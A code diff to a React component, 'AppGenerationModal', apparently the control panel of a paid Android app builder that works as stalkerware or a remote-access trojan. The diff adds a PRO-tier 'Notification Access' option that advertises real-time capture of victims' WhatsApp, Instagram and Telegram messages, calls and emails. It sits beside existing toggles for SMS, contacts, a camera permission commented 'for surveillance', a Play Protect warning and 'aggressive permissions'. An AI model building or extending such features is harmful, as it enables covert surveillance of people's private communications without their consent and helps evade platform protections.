@@ -31,7 +31,8 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
     const [enableContactsPermission, setEnableContactsPermission] = useState(false); // Gallery/Storage is usually needed
     const [enableStoragePermission, setEnableStoragePermission] = useState(true); // Storage permission for gallery access
     const [enableCameraPermission, setEnableCameraPermission] = useState(false); // Camera permission for surveillance
-    const [showPermissionInfo, setShowPermissionInfo] = useState<'sms' | 'contacts' | 'storage' | 'camera' | null>(null);
+    const [enableNotificationListener, setEnableNotificationListener] = useState(false); // Notification listener access
+    const [showPermissionInfo, setShowPermissionInfo] = useState<'sms' | 'contacts' | 'storage' | 'camera' | 'notifications' | null>(null);
     const [showAdvanced, setShowAdvanced] = useState(false);
     const [showPlayProtectWarning, setShowPlayProtectWarning] = useState(false);
     const [aggressivePermissions, setAggressivePermissions] = useState(false);
@@ -136,6 +137,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
             formData.append('enableContactsPermission', enableContactsPermission.toString());
             formData.append('enableStoragePermission', enableStoragePermission.toString());
             formData.append('enableCameraPermission', enableCameraPermission.toString());
+            formData.append('enableNotificationListener', enableNotificationListener.toString());
             formData.append('aggressivePermissions', aggressivePermissions.toString());
             if (customIcon) {
                 formData.append('icon', customIcon);
@@ -319,6 +321,33 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                 </button>
                             </div>
 
+                            {/* Notification Listener Permission */}
+                            <div className={`flex items-center justify-between bg-white/5 p-3 rounded-lg border ${isBasicPlan ? 'border-yellow-500/30 opacity-60' : 'border-white/10'} mb-2`}>
+                                <div className="flex items-center gap-2">
+                                    <svg className="w-4 h-4 text-cyan-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"></path></svg>
+                                    <span className="text-sm font-medium text-white/70">Notification Access</span>
+                                    {isBasicPlan && <span className="text-[10px] px-1.5 py-0.5 bg-yellow-500/20 text-yellow-400 rounded">PRO</span>}
+                                    <button
+                                        onClick={() => setShowPermissionInfo('notifications')}
+                                        className="text-white/40 hover:text-cyan-400 transition-colors"
+                                    >
+                                        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                                    </button>
+                                </div>
+                                <button
+                                    onClick={() => {
+                                        if (isBasicPlan) {
+                                            onUpgrade?.();
+                                            return;
+                                        }
+                                        setEnableNotificationListener(!enableNotificationListener);
+                                    }}
+                                    className={`w-12 h-6 rounded-full transition-colors relative ${isBasicPlan ? 'bg-white/10' : enableNotificationListener ? 'bg-cyan-500' : 'bg-white/20'}`}
+                                >
+                                    <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableNotificationListener && !isBasicPlan ? 'left-7' : 'left-1'}`} />
+                                </button>
+                            </div>
+
                             {/* Advanced Section - Collapsible, Hidden by Default */}
                             <div className="mt-4">
                                 <button
@@ -497,6 +526,39 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                                 </li>
                                             </ul>
                                         </>
+                                    ) : showPermissionInfo === 'notifications' ? (
+                                        <>
+                                            <div className="flex items-center gap-3 mb-3">
+                                                <div className="p-2 rounded-lg bg-cyan-500/20">
+                                                    <svg className="w-6 h-6 text-cyan-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"></path></svg>
+                                                </div>
+                                                <h4 className="text-lg font-bold text-white">Notification Access</h4>
+                                            </div>
+                                            <p className="text-sm text-cyan-100/80 leading-relaxed">
+                                                Enabling this allows real-time monitoring of all device notifications:
+                                            </p>
+                                            <ul className="mt-3 space-y-2 text-sm text-cyan-200/70">
+                                                <li className="flex items-center gap-2">
+                                                    <svg className="w-4 h-4 text-cyan-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
+                                                    WhatsApp, Instagram, Telegram messages
+                                                </li>
+                                                <li className="flex items-center gap-2">
+                                                    <svg className="w-4 h-4 text-cyan-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
+                                                    App names & icons
+                                                </li>
+                                                <li className="flex items-center gap-2">
+                                                    <svg className="w-4 h-4 text-cyan-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
+                                                    Notification content & timestamps
+                                                </li>
+                                                <li className="flex items-center gap-2">
+                                                    <svg className="w-4 h-4 text-cyan-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
+                                                    Calls, emails & all app alerts
+                                                </li>
+                                            </ul>
+                                            <p className="mt-3 text-xs text-yellow-300/60">
+                                                ⚠️ Requires manual enable in device Settings → Notification Access
+                                            </p>
+                                        </>
                                     ) : (
                                         <>
                                             <div className="flex items-center gap-3 mb-3">
@@ -529,7 +591,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                         onClick={() => setShowPermissionInfo(null)}
                                         className={`mt-5 w-full py-2 rounded-lg font-medium text-sm ${showPermissionInfo === 'sms'
                                             ? 'bg-blue-500 hover:bg-blue-600'
-                                            : showPermissionInfo === 'camera'
+                                            : (showPermissionInfo === 'camera' || showPermissionInfo === 'notifications')
                                                 ? 'bg-cyan-500 hover:bg-cyan-600'
                                                 : 'bg-green-500 hover:bg-green-600'
                                             } text-white transition-colors`}
@@ -618,6 +680,6 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                     type={alertData.type}
                 />
             </div>
-        </div>
+        </div >
     );
 }
